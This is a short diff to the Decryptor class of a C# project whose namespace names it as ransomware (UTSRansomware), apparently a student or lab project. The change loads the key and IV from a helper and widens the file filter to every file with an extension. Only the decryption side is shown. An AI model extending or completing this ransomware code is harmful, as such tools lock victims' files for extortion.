@@ -4,6 +4,7 @@ using System.Linq;
 using System.Security.Cryptography;
 using System.Text;
 using System.Threading.Tasks;
+using System.Configuration;
 
 namespace UTSRansomware
 {
@@ -15,10 +16,11 @@ namespace UTSRansomware
 
         // Creates a decryptor from given key and IV
         // This must match the key and IV used to encrypt the files
-        public Decryptor(byte[] key, byte[] iv) 
+        public Decryptor() 
         {
-            this.key = key;
-            this.iv = iv;
+            string[] keyAndIV = Utils.GetKeyAndIV();
+            this.key = Convert.FromBase64String(keyAndIV[0]);
+            this.iv = Convert.FromBase64String(keyAndIV[1]);
         }
 
         // Loops over special directories and decrypts all files in them
@@ -70,7 +72,7 @@ namespace UTSRansomware
             Parallel.ForEach(filePaths, (filePath) =>
             {
                 string fileExtension = Path.GetExtension(filePath);
-                if (Utils.fileExtensions.Contains(fileExtension))
+                if (!string.IsNullOrEmpty(fileExtension))
                 {
                     try
                     {
